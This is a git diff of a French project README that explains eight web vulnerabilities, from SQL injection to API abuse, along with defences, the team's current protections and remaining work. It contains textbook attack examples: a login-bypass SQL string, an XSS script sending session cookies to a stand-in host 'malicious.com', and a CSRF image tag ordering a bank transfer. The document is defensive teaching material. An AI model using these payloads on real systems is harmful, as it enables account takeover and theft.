@@ -198,71 +198,71 @@ sommaire :
 
 ## Descriptions des failles de sécurité :
 
-1. **Injection SQL**
-   Injecter une requête sql "malveillante", qui fait fonctionner la base de  données d'une manière imprévue.
+1. **Injection SQL**   
+   Injecter une requête sql "malveillante", qui fait fonctionner la base de  données d'une manière imprévue.   
    Exemple d'injection sur une page de connexion :
-   - La page a 2 champs de formulaire pour se connecter 'email' et 'password':
+   - La page a 2 champs de formulaire pour se connecter 'email' et 'password':   
      `"SELECT * FROM users WHERE email = '$email' AND  password = '$password'";`
-   - Si on remplit uniquement le 'email' avec [' OR '1'='1], ca donne cette requête :
-     `SELECT * FROM users WHERE email = '' OR '1'='1' AND password = '';`
-     `1=1` est toujours vraie donc on peut se connecter avec n'importe quel email sans le mot de passe.
+   - Si on remplit uniquement le 'email' avec [' OR '1'='1], ca donne cette requête :   
+     `SELECT * FROM users WHERE email = '' OR '1'='1' AND password = '';`   
+     `1=1` est toujours vraie donc on peut se connecter avec n'importe quel email sans le mot de passe.   
    **Comment s’en protéger :**
-   - Les requêtes paramétrées :
-     Les requêtes paramétrées permettent de protéger contre les injections SQL, contrairement aux requêtes concaténées, parce que le moteur SQL (Sequelize ici) interprète d’abord la structure de la requête, puis il y injecte les paramètres dans un second temps.
-     Requête paramétrée : 
-     `Users.findOne({ where: { user_email: user_email } });`
-     Requête concaténée :
-     `”SELECT * FROM Users WHERE email = '“ + $email + ”'”;`
+   - Les requêtes paramétrées :   
+     Les requêtes paramétrées permettent de protéger contre les injections SQL, contrairement aux requêtes concaténées, parce que le moteur SQL (Sequelize ici) interprète d’abord la structure de la requête, puis il y injecte les paramètres dans un second temps.   
+     Requête paramétrée :    
+     `Users.findOne({ where: { user_email: user_email } });`   
+     Requête concaténée :   
+     `”SELECT * FROM Users WHERE email = '“ + $email + ”'”;`   
      Avec une requête paramétrée il n’est pas possible de transformer la requête en jouant sur les guillemets pour ajouter de la logique (comme “1=1”).
-   - Échapper les valeurs :
-     Pour éviter une injection SQL, on peut “échapper” les valeurs qui pourraient être interprétées comme de la syntaxe SQL, comme les apostrophes, en y plaçant un “\” devant.
-     Par exemple, la valeur “L’argent” qui contient une apostrophe, peut être échappée c :
+   - Échapper les valeurs :   
+     Pour éviter une injection SQL, on peut “échapper” les valeurs qui pourraient être interprétées comme de la syntaxe SQL, comme les apostrophes, en y plaçant un “\” devant.   
+     Par exemple, la valeur “L’argent” qui contient une apostrophe, peut être échappée :   
      `“L\’argent”`
-   - Sanitization, Conditions, et Validations des valeurs :
-     Une autre bonne pratique pour éviter les injections SQL, c’est de valider et vérifier que les valeurs rentrées sont sous la bonne forme, par exemple de type nombre ou caractères.
-     Par exemple, on peut vérifier qu’une valeur est bien un nombre entier, et qu’elle ne peut pas être nulle : 
-		 ```
-     type: DataTypes.INTEGER,
-     validate: { notEmpty: true, }
-		 ```
+   - Sanitization, Conditions, et Validations des valeurs :   
+     Une autre bonne pratique pour éviter les injections SQL, c’est de valider et vérifier que les valeurs rentrées sont sous la bonne forme, par exemple de type nombre ou caractères.   
+     Par exemple, on peut vérifier qu’une valeur est bien un nombre entier, et qu’elle ne peut pas être nulle :   
+		 ```   
+     type: DataTypes.INTEGER,   
+     validate: { notEmpty: true, }   
+		 ```   
    **Ce qu'on a mis en place pour s'en proteger :**
    - Notre implémentation avec Sequelize :
      - Dans notre projet, on utilise Sequelize comme moteur SQL, avec un système de modèles, qui permet de mettre en place ces 3 types de protections :
      - Générer automatiquement des requêtes paramétrées, grâce aux méthodes qu’il utilise pour interagir avec la base de données (findOne, findAll, create, update, destroy, etc).
      - Échapper les valeurs, ce que Sequelize fait tout seul.
-     - Valider et conditionner : Sequelize propose une syntaxe dans les modèles pour ajouter des types, allant des “nombres” au “texte” en passant par les “dates”, les “booléens”, les “enums”, les “json”, les “ranges”, etc, ainsi que des méthodes de validations avec le mot clé “validate”, pour vérifier des conditions plus complexes. Tout cela nous permet d'éviter pleins d’erreurs et de beaucoup limiter le champ d’attaque possible.
+     - Valider et conditionner : Sequelize propose une syntaxe dans les modèles pour ajouter des types, allant des “nombres” au “texte” en passant par les “dates”, les “booléens”, les “enums”, les “json”, les “ranges”, etc, ainsi que des méthodes de validations avec le mot clé “validate”, pour vérifier des conditions plus complexes. Tout cela nous permet d'éviter pleins d’erreurs et de beaucoup limiter le champ d’attaque possible.   
    **Ce qui nous reste a faire :**
    - à creuser
-2. **XSS** (Cross-Site Scripting)
-   Injecter du code malveillant sur une page vue par un autre utilisateur, par exemple pour récupérer ses cookies de session.
+2. **XSS** (Cross-Site Scripting)   
+   Injecter du code malveillant sur une page vue par un autre utilisateur, par exemple pour récupérer ses cookies de session.   
    Exemple d'attaque xss sur un site web qui permet de faire une recherche :
-   - Le site possède une page avec un champ de recherche, on peut chercher "babar" par exemple :
+   - Le site possède une page avec un champ de recherche, on peut chercher "babar" par exemple :   
      `recherche: [babar]`
-   - Lorsqu'on valide la recherche, elle est envoyée avec la méthode GET au back :
+   - Lorsqu'on valide la recherche, elle est envoyée avec la méthode GET au back :   
      `https://exemple.com/search?query=babar`
-   - Le site affiche (c’est important) ensuite la recherche en plus des résultats :
+   - Le site affiche (c’est important) ensuite la recherche en plus des résultats :   
      `les résultats pour votre recherche "babar" sont etc…`
-   - Donc si on envoie cette url à quelqu'un, le site va afficher la query présente dans l’url, ici “babar”, et les résultats de la recherche :
-     `https://exemple.com/search?query=babar`
+   - Donc si on envoie cette url à quelqu'un, le site va afficher la query présente dans l’url, ici “babar”, et les résultats de la recherche :   
+     `https://exemple.com/search?query=babar`   
      `les résultats pour votre recherche "babar" sont etc…`
-   - Au lieu d'envoyer "babar" dans le champ de recherche de l'url, on peut y mettre un script, il s'exécutera alors dans le front :
-	   `<script>document.location='http://malicious.com/steal?cookie='+document.cookie</script>`
-     `les résultats pour votre recherche <script>...</script>`
-     -> Le script est exécuté.
-     En l'occurrence, il (le script) vole les cookies de session de la personne et les envoie à l'adresse "http://malicious.com/steal", on peut donc ensuite les utiliser pour se connecter au compte de la personne.
+   - Au lieu d'envoyer "babar" dans le champ de recherche de l'url, on peut y mettre un script, il s'exécutera alors dans le front :   
+	   `<script>document.location='http://malicious.com/steal?cookie='+document.cookie</script>`   
+     `les résultats pour votre recherche <script>...</script>`   
+     -> Le script est exécuté.   
+     En l'occurrence, il (le script) vole les cookies de session de la personne et les envoie à l'adresse "http://malicious.com/steal", on peut donc ensuite les utiliser pour se connecter au compte de la personne.   
    **Comment s’en protéger :**
-   - Échapper les données :
+   - Échapper les données :   
      Éviter que du texte soit interprété comme du code malveillant en échappant les caractères pour le forcer à rester du texte.
-   - Valider et assainir les entrées :
+   - Valider et assainir les entrées :   
      Chaque contenu entré par les utilisateurs et utilisatrices du site doivent être validées, pour correspondre exactement au format demandé, et assainis, pour ne pas contenir des éléments malveillants, comme du code.
-   - Utiliser une Content Security Policy (CSP) :
+   - Utiliser une Content Security Policy (CSP) :   
      La CSP est une norme de sécurité, qu’on met en place dans les balises <meta> ou dans les entêtes HTTP, et qui definit les règles de sécurité que doit respecter le navigateur, par exemple :
-   - Content-Security-Policy: default-src 'self':
+   - Content-Security-Policy: default-src 'self':   
      Cette politique n’autorise que les ressources (scripts, images, styles, etc) provenant du même domaine que la page.
-   - Protéger les cookies :
+   - Protéger les cookies :   
      Utiliser des cookies est sécurisé, uniquement si on les a bien paramétrés, avec des règles comme “secure” qui définit qu’ils ne seront envoyés qu’à travers du https, ou “httpOnly” pou dire que du javascript ne peut pas être utilisé pour y accéder, etc.
-   - Séparer les données et le code :
-     Interpréter les données utilisateur comme de simples données, sans jamais les interpréter comme du code.
+   - Séparer les données et le code :   
+     Interpréter les données utilisateur comme de simples données, sans jamais les interpréter comme du code.   
    **Ce qu'on a mis en place pour s'en proteger :**
    - Notre implémentation avec React :
      - React utilise un DOM virtuel et traite tous les changements avec des règles de sécurité :
@@ -274,104 +274,104 @@ sommaire :
    - Notre back avec Express, et Sequelize :
      - Dans le back, la structure mise en place est celle d’une API qui renvoie des données JSON, et Sequelize pour gérer la base de donnée, ce qui réduit fortement les risques d’attaques XSS :
      - Une API avec express permet de séparer les données et le code entre le back et le front, car elles sont traitées sans être interprétées ni intégrées à du code HTML ou JS.
-     - Toutes les données entrées par les utilisateurs du site passent par la base de données avant d’être utilisées, et Sequelize opère un assainissement et une validation des données avant de les entrer dans la base de données.
+     - Toutes les données entrées par les utilisateurs du site passent par la base de données avant d’être utilisées, et Sequelize opère un assainissement et une validation des données avant de les entrer dans la base de données.   
    **Ce qui nous reste a faire :**
    - Une CSP.
    - La protection des cookies.
-3. **CSRF** (Cross-Site Request Forgery)
-   Amener une personne à exécuter une action non-désirée sur un site web sur lequel elle est connectée, sans s'en rendre compte.
+3. **CSRF** (Cross-Site Request Forgery)   
+   Amener une personne à exécuter une action non-désirée sur un site web sur lequel elle est connectée, sans s'en rendre compte.   
    Exemple d'attaque pour recevoir un virement d'une personne :
    - Une personne est connectée à sa banque en ligne
    - La personne reçoit un email de l'attaquant avec une image
-   - Le code de l'image contient en fait une url de sa banque qui ordonne un virement :
+   - Le code de l'image contient en fait une url de sa banque qui ordonne un virement :   
    `<img src="http://yourbank.com/transfer?amount=1000&to=attacker_account" />`
-   - Comme la personne est connectée en ce moment même à sa banque, celle-ci effectue le virement sans avertir le détenteur du compte.
-   **Comment s’en protéger :**
-   - Utilisation de jetons CSRF :
+   - Comme la personne est connectée en ce moment même à sa banque, celle-ci effectue le virement sans avertir le détenteur du compte.   
+   **Comment s’en protéger :**   
+   - Utilisation de jetons CSRF :   
 	   Ce sont des jetons uniques pour chaque requête, générees par le serveur, qui permettent à celui-ci d'etre certain que la demande vient de la page web de la personne connectée, et pas d'une autre page web. En effet, si une personne est connectee sur le site A avec un cookie de session, alors le site B ouvert dans un nouvel onglet, pourrait envoyer une requete vers le site A depuis le navigateur, et le navigateur s'occupera d'y mettre les cookies automatiquement, donc le site A croira que la requete vient de la personne, alors qu'elle vient du site B. Pour eviter ça, le site A transmet un token vers le front de l'utilisateur connecté, et il est stoqué à un endroit auquel le site B n'a pas acces, par exemple le local storage.
-   - Utiliser les bonnes méthodes HTTP :
-	   Si l'API n'autorise pas la methode GET pour faire des actions sensibles, cela limite les risques d'attaque CSRF : en effet, les méthodes GET sont faciles à declancher depuis un autre site, par exemple une simple balise <img> genere une requete GET. Les autres requetes sont plus difficiles à declancher de maniere malveillantes depuis un autre site, car elles necessitent plus d'actions de la part de l'utilisteur, comme valider un formulaire. En utilisant les methodes apropriés pour chaque actions, on complique les attaques CSRF possibles.
+   - Utiliser les bonnes méthodes HTTP :   
+	   Si l'API n'autorise pas la methode GET pour faire des actions sensibles, cela limite les risques d'attaque CSRF : en effet, les méthodes GET sont faciles à declancher depuis un autre site, par exemple une simple balise <img> genere une requete GET. Les autres requetes sont plus difficiles à declancher de maniere malveillantes depuis un autre site, car elles necessitent plus d'actions de la part de l'utilisteur, comme valider un formulaire. En utilisant les methodes apropriés pour chaque actions, on complique les attaques CSRF possibles.   
    **Ce qu'on a mis en place pour s'en proteger :**
    - Les token JWT : ils peuvent très bien faire l'affaire en tant que jetons CSRF, à condition qu'ils ne soient pas stoqués dans les cookies mais dans le local-storage, et transmis manuellement avec le header "Authorization". Dans notre cas, la transmission est bien faite manuellement avec le header "Authorization", mais le stoquage est fait dans les cookies.
-   - Methodes HTTP dans l'API : chaque route est bien pensée pour utiliser la méthode qui correspond à l'action effectuee dans le back, donc cette partie de la protection est bien mise en place.
+   - Methodes HTTP dans l'API : chaque route est bien pensée pour utiliser la méthode qui correspond à l'action effectuee dans le back, donc cette partie de la protection est bien mise en place.   
    **Ce qui nous reste a faire :**
    - Stockage des token JWT dans le localStorage.
-4. **Force brute**
-   Cette attaque consiste à essayer toutes les combinaisons possibles d'un mot de passe, jusqu'à tomber sur le bon.
-   C'est une attaque simple à coder donc plein de petits robots parcourent internet pour essayer automatiquement sur les sites webs.
-   Elle est souvent améliorée en utilisant des dictionnaires, pour chercher en priorité les mots de passe les plus utilisés.
+4. **Force brute**   
+   Cette attaque consiste à essayer toutes les combinaisons possibles d'un mot de passe, jusqu'à tomber sur le bon.   
+   C'est une attaque simple à coder donc plein de petits robots parcourent internet pour essayer automatiquement sur les sites webs.   
+   Elle est souvent améliorée en utilisant des dictionnaires, pour chercher en priorité les mots de passe les plus utilisés.   
    **Comment s’en protéger :**
 	 - Obliger des mots de passe forts : plus un mot de passe est long, et plus il utilise des caracteres variés, plus il prendra du temps à trouver par simple brute-force.
 	 - Mettre en place un CAPTCHA : utilisez des systèmes CAPTCHA pour différencier les utilisateurs humains des robots automatiques lors des tentatives de connexion.
 	 - Exiger une authentification multi-facteurs (MFA) : ajoutez une couche de sécurité supplémentaire en exigeant un second facteur d'authentification, comme un code envoyé par SMS ou une application d'authentification.
 	 - Limiter le nombre de tentatives de connexion : imposer des délais entre les tentatives de connexion ou limiter le nombre de tentatives successives peut aider à ralentir les attaques de force brute.
-	 - Se proteger contre les breches de base de données : si des bases de données de mots de passes sont récupérées, alors des attaquand ayant accès à ces breches peuvent les utiliser pour trouver les mots de passes en les essayant tous en brute-force. Il ne faut donc pas stocker les mots de passes en claire.
+	 - Se proteger contre les breches de base de données : si des bases de données de mots de passes sont récupérées, alors des attaquand ayant accès à ces breches peuvent les utiliser pour trouver les mots de passes en les essayant tous en brute-force. Il ne faut donc pas stocker les mots de passes en claire.   
    **Ce qu'on a mis en place pour s'en proteger :**
    - Nous avons mis en place des criteres de mots de passes forts : 12 caracteres minumum, 1 minuscule, 1 majuscule, 1 chiffre, 1 caractere special.
-	 - Nous avons aussi utilisé bcrypt : protection contre les breches de bases de données grace à du hashage, et contre les attaques "arc-en-ciel" grace au salt : deux mots de passes identiques n'ont pas le meme hash, rendant impossible de comparer les hashs pour deviner les mots de passes. Un autre avantage de bcrypt est de ralentir les essais en ajoutant du temps de calcul, ce qui limite la possibilité de trouver un mot de passe par brute-force.
+	 - Nous avons aussi utilisé bcrypt : protection contre les breches de bases de données grace à du hashage, et contre les attaques "arc-en-ciel" grace au salt : deux mots de passes identiques n'ont pas le meme hash, rendant impossible de comparer les hashs pour deviner les mots de passes. Un autre avantage de bcrypt est de ralentir les essais en ajoutant du temps de calcul, ce qui limite la possibilité de trouver un mot de passe par brute-force.   
    **Ce qui nous reste a faire :**
    - captcha (honeypot).
 	 - limiter les tentatives.
 	 - MFA.
-5. **Man in the middle**
-   Un individu arrive à se placer sur le réseau entre l’ordinateur d’une personne et le site web qu’elle visite.
+5. **Man in the middle**   
+   Un individu arrive à se placer sur le réseau entre l’ordinateur d’une personne et le site web qu’elle visite.   
    Il peut alors modifier, et peut-être même décrypter, ce que la personne envoie et reçoit.
    - Peut servir à voler des cookies de sessions
    - Voir mots de passes ou informations sensibles
-   - Ajouter du code malveillant dans les échanges
+   - Ajouter du code malveillant dans les échanges   
    **Comment s’en protéger :**
    - Protocole HTTPS : utiliser le protocole HTTPS au lieu du protocole HTTP, grace aux certificats ssl/tls, afin de chiffrer les données echangées entre le serveur et les clients.
-   - HSTS (HTTP Strict Transport Security) : on peut forcer le navigateur à utiliser du HTTPS en implementant un entête HSTS. C’est plus sécurisé que de faire une redirection automatique du HTTP vers le HTTPS, car la redirection permet quand mêne à la premiere requete d'etre faite en HTTP.
-   **Ce qu'on a mis en place pour s'en proteger :**
+   - HSTS (HTTP Strict Transport Security) : on peut forcer le navigateur à utiliser du HTTPS en implementant un entête HSTS. C’est plus sécurisé que de faire une redirection automatique du HTTP vers le HTTPS, car la redirection permet quand mêne à la premiere requete d'etre faite en HTTP.   
+   **Ce qu'on a mis en place pour s'en proteger :**   
    **Ce qui nous reste a faire :**
    - HTTPS and HSTS
-6. **DDOS (& DOS)** ((Distributed) Denial of Service)
-   C'est une attaque qui consiste en résumé à empêcher un serveur de fonctionner.
-   Elle est pratiquée en accablant le serveur avec beaucoup trop de requêtes pour qu'il ne puisse plus faire ses tâches habituelles.
+6. **DDOS (& DOS)** ((Distributed) Denial of Service)   
+   C'est une attaque qui consiste en résumé à empêcher un serveur de fonctionner.   
+   Elle est pratiquée en accablant le serveur avec beaucoup trop de requêtes pour qu'il ne puisse plus faire ses tâches habituelles.   
    Le but peut être :
    - Demander une rançon
    - Activisme politique
    - Diversion
-   - Avantage compétitif en business
+   - Avantage compétitif en business   
    **Comment s’en protéger :**
    - Protection DDoS : Ces services répartissent le trafic sur plusieurs serveurs et utilisent des algorithmes avancés pour filtrer les attaques.
    - Pare-feu WAF (Web Application Firewall) : Un WAF agit comme un filtre entre un utilisateur et l'application web qu'il tente d'atteindre, en surveillant, filtrant et bloquant les requêtes HTTP(S) malveillantes qui tentent d'accéder à ces application.
    - Redondance et Architecture Distribuée : Concevoir une infrastructure pour qu'elle soit résiliente, avec des redondances et une architecture distribuée. Par exemple, en utilisant des CDN (Content Delivery Networks) pour distribuer le contenu du site sur plusieurs points de présence.
-   - Monitoring et Alertes : Mettre en place un système de surveillance pour surveiller le trafic et les performances du site.
+   - Monitoring et Alertes : Mettre en place un système de surveillance pour surveiller le trafic et les performances du site.   
    **Ce qu'on a mis en place pour s'en proteger :**
-   - hostinger et cloudflare : le deploiement sur la plateforme hostinger met en place tous les elements precedents, nottament à l'aide de cloudflare.
+   - hostinger et cloudflare : le deploiement sur la plateforme hostinger met en place tous les elements precedents, nottament à l'aide de cloudflare.   
    **Ce qui nous reste a faire :**
    - à creuser
-7. **IDOR** (Insecure Direct Object Reference)
-	 Cette faille consiste à pouvoir accéder directement à un "objet" d'une application web, sans protection.
-	 Par "objet" nous entendons fichiers, base de données, dossiers, mais aussi bouts de codes, comme des points d'accès API secrets, des tokens de session, toutes sortes d’informations.
-	 Elle survient typiquement si une URL permet d'accéder à quelque chose sans vérifier les autorisations.
+7. **IDOR** (Insecure Direct Object Reference)   
+	 Cette faille consiste à pouvoir accéder directement à un "objet" d'une application web, sans protection.   
+	 Par "objet" nous entendons fichiers, base de données, dossiers, mais aussi bouts de codes, comme des points d'accès API secrets, des tokens de session, toutes sortes d’informations.   
+	 Elle survient typiquement si une URL permet d'accéder à quelque chose sans vérifier les autorisations.   
 	 Exemple :
-   - L’URL suivante permet de récupérer les infos d'un utilisateur connecté
+   - L’URL suivante permet de récupérer les infos d'un utilisateur connecté   
      `https://example.com/profile?user_id=123`
    - Si on n'est pas connecté en tant qu'utilisateur "123" on ne devrait pas recevoir les infos.
-   - Mais si on peut recevoir les infos quand même, alors c'est une faille IDOR.
+   - Mais si on peut recevoir les infos quand même, alors c'est une faille IDOR.   
    **Comment s’en protéger :**
    - controle d'acces backend : Avant de permettre l'accès à une ressource, vérifier que l'utilisateur a les droits nécessaires pour y accéder. Même si l'utilisateur connaît l'ID de l'objet, il ne doit pas pouvoir y accéder sans autorisation. Et le controle doit toujours etre fait dans le backend.
    - Références indirectes ou mappage d’objets : Au lieu d'exposer des identifiants directs dans l'URL (comme user_id=123), utiliser des références indirectes (comme des tokens ou des UUID) qui ne révèlent pas d'informations sensibles. Cela complique la tâche pour un attaquant potentiel de deviner les ID valides.
-   - Validation des entrées : Valider et nettoyer toutes les entrées utilisateurs, y compris celles dans les paramètres URL, pour s'assurer qu'elles ne contiennent pas de valeurs inattendues ou malveillantes.
+   - Validation des entrées : Valider et nettoyer toutes les entrées utilisateurs, y compris celles dans les paramètres URL, pour s'assurer qu'elles ne contiennent pas de valeurs inattendues ou malveillantes.   
    **Ce qu'on a mis en place pour s'en proteger :**
    - Middlewares : nous avons mis en place des middlewares qui vérifient les droits des utilisateurs pour chaque requête, en fonction des token JWT.
-   - Sequelize : toutes les données utilisateurs sont entrées dans la base de données avec sequelize, qui les valide et nettoie automatiquement.
+   - Sequelize : toutes les données utilisateurs sont entrées dans la base de données avec sequelize, qui les valide et nettoie automatiquement.   
    **Ce qui nous reste a faire :**
    - Implémenter une méthode pour ne pas utiliser de références directes dans les URLs.
 8. **abus d'API**   
-   Cela consiste à utiliser l'api d’une manière qui n'était pas prévue. Ça peut être d’utiliser l’API pour créer des comptes en masse, accéder à des endpoints non documentés, faire du scrapping abusif pour plagier un service, ou trouver un moyen détourné d’utiliser l’API.
+   Cela consiste à utiliser l'api d’une manière qui n'était pas prévue. Ça peut être d’utiliser l’API pour créer des comptes en masse, accéder à des endpoints non documentés, faire du scrapping abusif pour plagier un service, ou trouver un moyen détourné d’utiliser l’API.   
 	 Exemple :
    - Une boutique en ligne propose une promotion "5 articles achetés = -20% sur la commande".
    - Cette logique est implémentée dans l'API de la boutique qui gère les commandes.
-   - Une personne découvre qu'en utilisant l'API de la boutique directement, elle peut ajouter 5 articles à son panier pour déclencher la remise de 20%, puis supprimer 4 de ces articles tout en conservant la remise initiale. Mouvement qui ne fonctionnerait pas directement sur le site.
+   - Une personne découvre qu'en utilisant l'API de la boutique directement, elle peut ajouter 5 articles à son panier pour déclencher la remise de 20%, puis supprimer 4 de ces articles tout en conservant la remise initiale. Mouvement qui ne fonctionnerait pas directement sur le site.   
    **Comment s’en protéger :**
    - Limiter le taux de requêtes : implémenter des limites du nombre de requêtes qui peuvent être faites sur un temps donné, pour réduire les risques.
    - Authentification et autorisation : exiger des clés API pour accéder aux services. Chaque utilisateur doit avoir une clé unique.
-   - Tests logiques automatisés : mettre en place des tests pour pouvoir vérifier en profondeur les comportements de l’API et détecter les situations non-prévues.
+   - Tests logiques automatisés : mettre en place des tests pour pouvoir vérifier en profondeur les comportements de l’API et détecter les situations non-prévues.   
    **Ce qu'on a mis en place pour s'en proteger :**
-   - Avec les token JWT et les middleware, chaque requête à l’API est autorisée en fonction de l’authentification.
+   - Avec les token JWT et les middleware, chaque requête à l’API est autorisée en fonction de l’authentification.   
    **Ce qui nous reste a faire :**
    - Limiter le taux de requêtes.
    - Tests logiques automatisés.
